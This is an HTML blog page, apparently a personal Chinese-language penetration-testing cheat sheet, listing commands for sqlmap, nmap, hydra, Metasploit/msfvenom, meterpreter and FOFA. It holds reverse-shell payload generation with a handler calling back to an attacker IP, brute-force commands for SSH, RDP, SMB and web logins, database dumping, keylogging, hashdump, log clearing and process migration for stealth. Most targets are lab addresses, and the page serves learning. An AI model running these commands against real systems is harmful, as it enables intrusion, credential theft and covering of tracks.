@@ -1,0 +1,1076 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <meta name="author" content="Magi2B0y" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      常用攻击工具命令 
+      
+      
+      |
+    
+     Hexo
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/cat-avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">MagicBoy</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">常用攻击工具命令</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2023-01-26 22:11:22
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" title="漏洞挖掘">
+                    <b>#</b> 漏洞挖掘
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <style>
+.center 
+{
+  width: auto;
+  display: table;
+  margin-left: auto;
+  margin-right: auto;
+}
+</style>
+
+
+<h1 id="1-sqlmap"><a href="#1-sqlmap" class="headerlink" title="1. sqlmap"></a>1. sqlmap</h1><h2 id="1-1-sqlmap注入检测"><a href="#1-1-sqlmap注入检测" class="headerlink" title="1.1. sqlmap注入检测"></a>1.1. sqlmap注入检测</h2><table>
+<thead>
+<tr>
+<th>功能</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET参数注入</td>
+<td>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” <br> sqlmap默认测试所有的GET和POST参数，但可以手动用-p参数设置想要测试的参数。例如：-p “id,user-anget” <br> 当使用–level的值很大但是有个别参数不想测试的时候可以使用–skip参数</td>
+</tr>
+<tr>
+<td>POST参数注入</td>
+<td>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1”  –data&#x3D;”id&#x3D;1” <br> sqlmap.py -r “c:\Users\fendo\Desktop\post.txt” -p n –dbs (-r表示加载一个文件，-p指定参数)</td>
+</tr>
+<tr>
+<td>cookie注入 （level&gt;&#x3D;2时才会检测cookie）</td>
+<td>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –level 2 <br> sqlmap  -r “&#x2F;root&#x2F;1.txt” (POST注入过程中，用 * 号指定cookie，这样就可以检测cookie。)</td>
+</tr>
+<tr>
+<td>user-agent注入</td>
+<td>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –level 3 <br> sqlmap  -r “&#x2F;root&#x2F;1.txt” (POST注入过程中，用 * 号指定user-agent，这样就可以检测user-agent。)</td>
+</tr>
+<tr>
+<td>referer注入</td>
+<td>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –level 3 <br> sqlmap -r root&#x2F;1.txt” (POST注入过程中，用 * 号指定referer，这样就可以检测referer。)</td>
+</tr>
+<tr>
+<td>host注入</td>
+<td>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –level 5 <br> sqlmap -r root&#x2F;1.txt” (POST注入过程中，用 * 号指定referer，这样就可以检测referer。)</td>
+</tr>
+</tbody></table>
+<h2 id="1-2-sqlmap获取数据库信息"><a href="#1-2-sqlmap获取数据库信息" class="headerlink" title="1.2. sqlmap获取数据库信息"></a>1.2. sqlmap获取数据库信息</h2><table>
+<thead>
+<tr>
+<th>功能</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查看数据库</td>
+<td>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –dbs  –batch</td>
+</tr>
+<tr>
+<td>查看数据库里面的表</td>
+<td>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” -D security –tables –batch</td>
+</tr>
+<tr>
+<td>查看数据库表里面的列</td>
+<td>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” -D security -T users –columns   –batch</td>
+</tr>
+<tr>
+<td>查看数据库列里面的具体的值</td>
+<td>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” -D security -T users -C password –dump  –batch</td>
+</tr>
+</tbody></table>
+<h2 id="1-3-sqlmap获取shell"><a href="#1-3-sqlmap获取shell" class="headerlink" title="1.3. sqlmap获取shell"></a>1.3. sqlmap获取shell</h2><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1”  –os-shell</p>
+<h1 id="2-nmap"><a href="#2-nmap" class="headerlink" title="2. nmap"></a>2. nmap</h1><h2 id="2-1-附加参数介绍"><a href="#2-1-附加参数介绍" class="headerlink" title="2.1. 附加参数介绍"></a>2.1. 附加参数介绍</h2><table>
+<thead>
+<tr>
+<th>附加参数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-Pn</td>
+<td>防止NMAP的发送初始数据包到目标机器，不检测主机存活</td>
+</tr>
+<tr>
+<td>-p-</td>
+<td>将扫描所有65535个端口</td>
+</tr>
+<tr>
+<td>-D</td>
+<td>ip地址欺骗 <br>  nmap -D RND:5 <code>ip</code> (RND:为生成随机ip地址)</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>指定端口扫描</td>
+</tr>
+<tr>
+<td>-A</td>
+<td>全面扫描，综合扫描，是一种完整扫描目标信息的扫描方式</td>
+</tr>
+<tr>
+<td>-O</td>
+<td>nmap进行OS探测</td>
+</tr>
+<tr>
+<td>-sS</td>
+<td>TCP、SYN扫描（匿名扫描，默认不加类型，需要root权限，扫描速度快）</td>
+</tr>
+<tr>
+<td>-sT</td>
+<td>TCP全连接扫描（不需要root权限，TCP扫描的默认模式，端口状态和SYN相同，耗时长）</td>
+</tr>
+<tr>
+<td>-sU</td>
+<td>UDP扫描（扫描DNS，SNMP和DHCP等服务，更慢更困难）</td>
+</tr>
+<tr>
+<td>-sI</td>
+<td>用于闲置扫描和发送数据包欺骗</td>
+</tr>
+<tr>
+<td>-sV</td>
+<td>指定nmap进行版本探测</td>
+</tr>
+<tr>
+<td>–version-trace</td>
+<td>显示具体探测细节</td>
+</tr>
+</tbody></table>
+<h2 id="2-2-利用脚本扫描"><a href="#2-2-利用脚本扫描" class="headerlink" title="2.2. 利用脚本扫描"></a>2.2. 利用脚本扫描</h2><table>
+<thead>
+<tr>
+<th>功能</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>默认脚本扫描，主要搜索各种应用服务的信息，收集后，可再针对具体服务进行攻击</td>
+<td>nmap –script&#x3D;default 192.168.88.131</td>
+</tr>
+<tr>
+<td>检查是否存在常见漏洞</td>
+<td>nmap –script&#x3D;vuln 192.168.1.104</td>
+</tr>
+<tr>
+<td>提供暴力破解的方式，可对数据库、smb、snmp等进行简单密码的暴力猜解</td>
+<td>nmap –script&#x3D;brute 192.168.88.131</td>
+</tr>
+<tr>
+<td>利用FTP指定脚本对目标特定FTP协议进行密码爆破</td>
+<td>nmap –script&#x3D;ftp-brute.nse 192.168.88.131</td>
+</tr>
+<tr>
+<td>利用第三方的数据库或资源，例如进行whoise解析</td>
+<td>nmap –script&#x3D;external 192.168.88.131</td>
+</tr>
+<tr>
+<td>利用已知的漏洞入侵系统</td>
+<td>exploit</td>
+</tr>
+<tr>
+<td>模糊测试的脚本，发送异常的包到目标机，探测出潜在的漏洞</td>
+<td>fuzzer</td>
+</tr>
+</tbody></table>
+<h1 id="3-hydra"><a href="#3-hydra" class="headerlink" title="3. hydra"></a>3. hydra</h1><h2 id="3-1-附加参数介绍"><a href="#3-1-附加参数介绍" class="headerlink" title="3.1. 附加参数介绍"></a>3.1. 附加参数介绍</h2><table>
+<thead>
+<tr>
+<th>附加参数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-l</td>
+<td>小写，指定用户名进行破解</td>
+</tr>
+<tr>
+<td>-L</td>
+<td>大写，指定用户的用户名字典</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>小写，用于指定密码破解，很少使用，一般采用密码字典</td>
+</tr>
+<tr>
+<td>-P</td>
+<td>大写，用于指定密码字典</td>
+</tr>
+<tr>
+<td>-e ns</td>
+<td>额外的选项，n：空密码试探，s：使用指定账户和密码试探</td>
+</tr>
+<tr>
+<td>-M</td>
+<td>指定目标ip列表文件，批量破解</td>
+</tr>
+<tr>
+<td>-o</td>
+<td>指定结果输出文件</td>
+</tr>
+<tr>
+<td>-f</td>
+<td>找到第一对登录名或者密码的时候中止破解</td>
+</tr>
+<tr>
+<td>-t tasks</td>
+<td>同时运行的线程数，默认是16</td>
+</tr>
+<tr>
+<td>-w time</td>
+<td>设置最大超时时间，单位</td>
+</tr>
+<tr>
+<td>-v &#x2F; -V</td>
+<td>显示详细过程</td>
+</tr>
+<tr>
+<td>-R</td>
+<td>恢复爆破（如果破解中断了，下次执行 hydra -R &#x2F;path&#x2F;to&#x2F;hydra.restore 就可以继续任务。）</td>
+</tr>
+<tr>
+<td>-x</td>
+<td>自定义密码</td>
+</tr>
+</tbody></table>
+<h2 id="3-2-爆破"><a href="#3-2-爆破" class="headerlink" title="3.2. 爆破"></a>3.2. 爆破</h2><table>
+<thead>
+<tr>
+<th>功能</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>破解ssh</td>
+<td>hydra -l 用户名 -p 密码 -t 线程数 -vV -e ns <code>ip</code> ssh <br> hydra -l 用户名 -p 密码 -t 线程数 -o save.log -vV <code>ip</code> ssh</td>
+</tr>
+<tr>
+<td>破解ftp</td>
+<td>hydra -l 用户名 -P 密码 -t 线程(默认16) -vV <code>ip</code> ftp <br> hydra -l 用户名 -P 密码 -e ns -vV <code>ip</code> ftp</td>
+</tr>
+<tr>
+<td>get方式提交，破解web登录</td>
+<td>hydra -l 用户名 -p 密码 -t 线程 -vV -e ns <code>ip</code> http-get &#x2F;admin&#x2F; <br> hydra -l 用户名 -p 密码 -t 线程 -vV -e ns -f <code>ip</code> http-get &#x2F;admin&#x2F;index.php</td>
+</tr>
+<tr>
+<td>post方式提交，破解web登录</td>
+<td>hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form “login.php:id&#x3D;^USER^&amp;passwd&#x3D;^PASS^: &lt;title&gt; wrong username or password &lt;&#x2F;title&gt;” <br> （10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解, &lt;title&gt; 中的内容是表示错误猜解的返回信息提示。）</td>
+</tr>
+<tr>
+<td>破解https</td>
+<td>hydra -m &#x2F;index.php -l muts -P pass.txt 10.36.16.18 https</td>
+</tr>
+<tr>
+<td>破解teamspeak</td>
+<td>hydra -l 用户名 -P 密码 -s 端口号 -vV ip teamspeak</td>
+</tr>
+<tr>
+<td>破解cisco</td>
+<td>hydra -P pass.txt 10.36.16.18 cisco <br> hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable</td>
+</tr>
+<tr>
+<td>破解smb</td>
+<td>hydra -l administrator -P pass.txt 10.36.16.18 smb</td>
+</tr>
+<tr>
+<td>破解pop3</td>
+<td>hydra -l muts -P pass.txt my.pop3.mail pop3</td>
+</tr>
+<tr>
+<td>破解rdp</td>
+<td>hydra ip rdp -l administrator -P pass.txt -V</td>
+</tr>
+<tr>
+<td>破解http-proxy</td>
+<td>hydra -l admin -P pass.txt http-proxy:&#x2F;&#x2F;10.36.16.18</td>
+</tr>
+<tr>
+<td>破解imap</td>
+<td>hydra -L user.txt -p secret 10.36.16.18 imap PLAIN <br> hydra -C defaults.txt -6 imap:&#x2F;&#x2F;[fe80::2c:31ff:fe12:ac11]:143&#x2F;PLAIN</td>
+</tr>
+</tbody></table>
+<h1 id="4-MSF"><a href="#4-MSF" class="headerlink" title="4. MSF"></a>4. MSF</h1><h2 id="4-1-普通攻击流程"><a href="#4-1-普通攻击流程" class="headerlink" title="4.1. 普通攻击流程"></a>4.1. 普通攻击流程</h2><blockquote>
+<p>msfconsole</p>
+</blockquote>
+<blockquote>
+<p>search <code>相关漏洞</code></p>
+</blockquote>
+<blockquote>
+<p>use <code>exploit</code></p>
+</blockquote>
+<blockquote>
+<p>show options</p>
+</blockquote>
+<blockquote>
+<p>set LHOST <code>ip</code></p>
+</blockquote>
+<blockquote>
+<p>exploit</p>
+</blockquote>
+<h2 id="4-2-反弹木马"><a href="#4-2-反弹木马" class="headerlink" title="4.2. 反弹木马"></a>4.2. 反弹木马</h2><blockquote>
+<p><strong>windows32位:</strong> msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<code>192.168.223.132</code> LPORT&#x3D;<code>12345</code> -i 5 -f exe -o ~&#x2F;桌面&#x2F;test.exe</p>
+<p><strong>windows64位:</strong> msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<code>192.168.223.132</code> LPORT&#x3D;<code>12345</code> -i 5 -f exe -o ~&#x2F;桌面&#x2F;test.exe</p>
+<p><strong>Linux:</strong> msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<code>x.x.x.x</code> LPORT&#x3D;<code>5555</code> -a x86 –platform Linux -f elf &gt; shell.elf</p>
+</blockquote>
+<blockquote>
+<p>msfconsole</p>
+</blockquote>
+<blockquote>
+<p>use exploit&#x2F;multi&#x2F;handler</p>
+</blockquote>
+<blockquote>
+<p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
+</blockquote>
+<blockquote>
+<p>set LHOST <code>192.168.1.143</code></p>
+</blockquote>
+<blockquote>
+<p>set LPORT <code>12345</code></p>
+</blockquote>
+<blockquote>
+<p>exploit</p>
+</blockquote>
+<p>当靶机运行test.exe文件后，即可在kali 端获取连接</p>
+<h3 id="4-2-1-msfvenom-参数说明"><a href="#4-2-1-msfvenom-参数说明" class="headerlink" title="4.2.1 msfvenom 参数说明"></a>4.2.1 msfvenom 参数说明</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-p</td>
+<td>指定需要使用的payload(攻击荷载)</td>
+</tr>
+<tr>
+<td>-f</td>
+<td>指定输出格式</td>
+</tr>
+<tr>
+<td>-o</td>
+<td>指定创建好的payload的存放位置</td>
+</tr>
+<tr>
+<td>-i</td>
+<td>指定payload的编码次数</td>
+</tr>
+<tr>
+<td>-a</td>
+<td>指定payload的目标架构，例如x86 还是 x64 还是 x86_64</td>
+</tr>
+<tr>
+<td>–platform</td>
+<td>指定payload的目标平台</td>
+</tr>
+<tr>
+<td>PrependMigrate&#x3D;true PrependMigrateProc&#x3D;svchost.exe</td>
+<td>防止太显眼，msfvenom进程migrate，启动两个进程svchost.exe和shell.exe，PrependMigrate&#x3D;true PrependMigrateProc&#x3D;svchost.exe将进程默认迁移到svchost.exe中 （也可以写别的进程名）</td>
+</tr>
+</tbody></table>
+<h3 id="4-2-2-meterpreter-一些常用命令"><a href="#4-2-2-meterpreter-一些常用命令" class="headerlink" title="4.2.2. meterpreter 一些常用命令"></a>4.2.2. meterpreter 一些常用命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>getwd</td>
+<td>当前目录</td>
+</tr>
+<tr>
+<td>dir</td>
+<td>查看所有文件</td>
+</tr>
+<tr>
+<td>cat c:\123.txt</td>
+<td></td>
+</tr>
+<tr>
+<td>search -f cmd.exe</td>
+<td>搜索名为cmd.exe文件所在目录</td>
+</tr>
+<tr>
+<td>upload <code>要上传的文件</code> -&gt; <code>上传到的目录</code></td>
+<td>上传文件</td>
+</tr>
+<tr>
+<td>download <code>要下载的文件</code> <code>要下载的目录</code></td>
+<td>下载文件</td>
+</tr>
+<tr>
+<td>clearev</td>
+<td>清除日志</td>
+</tr>
+<tr>
+<td>getuid</td>
+<td>当前用户</td>
+</tr>
+<tr>
+<td>ps</td>
+<td>查看所用进程</td>
+</tr>
+<tr>
+<td>kill</td>
+<td>杀死某个进程</td>
+</tr>
+<tr>
+<td>sysinfo</td>
+<td>系统信息</td>
+</tr>
+<tr>
+<td>keyscan_start</td>
+<td>开始键盘记录</td>
+</tr>
+<tr>
+<td>keyscan_dump</td>
+<td>查看结果</td>
+</tr>
+<tr>
+<td>keyscan_stop</td>
+<td>停止键盘记录</td>
+</tr>
+<tr>
+<td>screenshot</td>
+<td>屏幕截图</td>
+</tr>
+<tr>
+<td>run vnc</td>
+<td>屏幕监控</td>
+</tr>
+<tr>
+<td>hashdump</td>
+<td>获取密文密码</td>
+</tr>
+<tr>
+<td>shell</td>
+<td>获取shell</td>
+</tr>
+</tbody></table>
+<h4 id="4-2-2-1-windows"><a href="#4-2-2-1-windows" class="headerlink" title="4.2.2.1 windows"></a>4.2.2.1 windows</h4><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>dir</td>
+<td>显示所有文件</td>
+</tr>
+<tr>
+<td>cd</td>
+<td>切换目录</td>
+</tr>
+<tr>
+<td>whoami</td>
+<td>查看当前用户级别</td>
+</tr>
+<tr>
+<td>net user</td>
+<td>查看用户列表</td>
+</tr>
+<tr>
+<td>net user 用户名 密码 &#x2F;add</td>
+<td>添加用户</td>
+</tr>
+<tr>
+<td>net user 用户名 密码</td>
+<td>更改用户密码</td>
+</tr>
+</tbody></table>
+<h1 id="5-FOFA"><a href="#5-FOFA" class="headerlink" title="5. FOFA"></a>5. FOFA</h1><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><table>
+<thead>
+<tr>
+<th>语法</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>title&#x3D;”beijing”</td>
+<td>从标题中搜索“北京”</td>
+</tr>
+<tr>
+<td>domain&#x3D;”qq.com”</td>
+<td>搜索根域名带有qq.com的网站</td>
+</tr>
+<tr>
+<td>host&#x3D;”qq.com”</td>
+<td>搜索host内所有带有qq.com的域名</td>
+</tr>
+<tr>
+<td>ip&#x3D;”58.63.236.248”</td>
+<td>搜索ip相关信息 <br> 支持ip段搜索： ip&#x3D;”111.1.1.1&#x2F;16”</td>
+</tr>
+<tr>
+<td>port&#x3D;”6379”</td>
+<td>查找对应“6379”端口的资产</td>
+</tr>
+<tr>
+<td>body&#x3D;”网络空间测绘”</td>
+<td>从html正文中搜索“网络空间测绘”</td>
+</tr>
+<tr>
+<td>header&#x3D;”elastic”</td>
+<td>从http头中搜索“elastic”</td>
+</tr>
+<tr>
+<td>icp&#x3D;”京ICP证030173号”</td>
+<td>查找备案号为“京ICP证030173号”的网站，搜索网站类型资产</td>
+</tr>
+<tr>
+<td>cert&#x3D;”baidu”</td>
+<td>搜索证书(https或者imaps等)中带有baidu的资产</td>
+</tr>
+<tr>
+<td>server&#x3D;&#x3D;”Microsoft-IIS&#x2F;10”</td>
+<td>搜索IIS-10服务器</td>
+</tr>
+<tr>
+<td>app&#x3D;”Microsoft-Exchange”</td>
+<td>搜索Microsoft-Exchange设备</td>
+</tr>
+<tr>
+<td>is_fraud&#x3D;false</td>
+<td>排除仿冒&#x2F;欺诈数据</td>
+</tr>
+<tr>
+<td>is_honeypot&#x3D;false</td>
+<td>排除蜜罐数据，仅限FOFA高级会员使用</td>
+</tr>
+<tr>
+<td>os&#x3D;”centos”</td>
+<td>搜索操作系统为CentOS资产</td>
+</tr>
+<tr>
+<td>country&#x3D;”CN”</td>
+<td>搜索指定国家(编码)的资产</td>
+</tr>
+</tbody></table>
+<h1 id="6-FTP远程连接命令"><a href="#6-FTP远程连接命令" class="headerlink" title="6. FTP远程连接命令"></a>6. FTP远程连接命令</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><table>
+<thead>
+<tr>
+<th>功能</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>连接FTP服务器</td>
+<td>ftp <code>ip</code></td>
+</tr>
+<tr>
+<td>下载文件</td>
+<td>a) get <code>remote-file</code> <code>local-file</code> <br> b) mget <code>remote-files</code></td>
+</tr>
+<tr>
+<td>上传文件</td>
+<td>a) put <code>local-file</code> <code>remote-file</code> <br> b) mput <code>local-files</code></td>
+</tr>
+<tr>
+<td>断开连接</td>
+<td>bye</td>
+</tr>
+</tbody></table>
+<h1 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h1>
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/08/13/Attribute-based_searchable_encryption/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2023-01-26 22:11:22
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" title="漏洞挖掘">
+                        <b>#</b> 漏洞挖掘
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/08/29/NMAP-of-Python-refactoring/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-sqlmap"><span class="toc-text">1. sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-sqlmap%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B"><span class="toc-text">1.1. sqlmap注入检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-sqlmap%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="toc-text">1.2. sqlmap获取数据库信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-sqlmap%E8%8E%B7%E5%8F%96shell"><span class="toc-text">1.3. sqlmap获取shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-nmap"><span class="toc-text">2. nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E9%99%84%E5%8A%A0%E5%8F%82%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="toc-text">2.1. 附加参数介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-text">2.2. 利用脚本扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-hydra"><span class="toc-text">3. hydra</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E9%99%84%E5%8A%A0%E5%8F%82%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="toc-text">3.1. 附加参数介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E7%88%86%E7%A0%B4"><span class="toc-text">3.2. 爆破</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-MSF"><span class="toc-text">4. MSF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E6%99%AE%E9%80%9A%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-text">4.1. 普通攻击流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E5%8F%8D%E5%BC%B9%E6%9C%A8%E9%A9%AC"><span class="toc-text">4.2. 反弹木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-1-msfvenom-%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E"><span class="toc-text">4.2.1 msfvenom 参数说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-2-meterpreter-%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">4.2.2. meterpreter 一些常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-2-1-windows"><span class="toc-text">4.2.2.1 windows</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-FOFA"><span class="toc-text">5. FOFA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">使用方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-FTP%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%91%BD%E4%BB%A4"><span class="toc-text">6. FTP远程连接命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">常用命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7"><span class="toc-text">7.</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
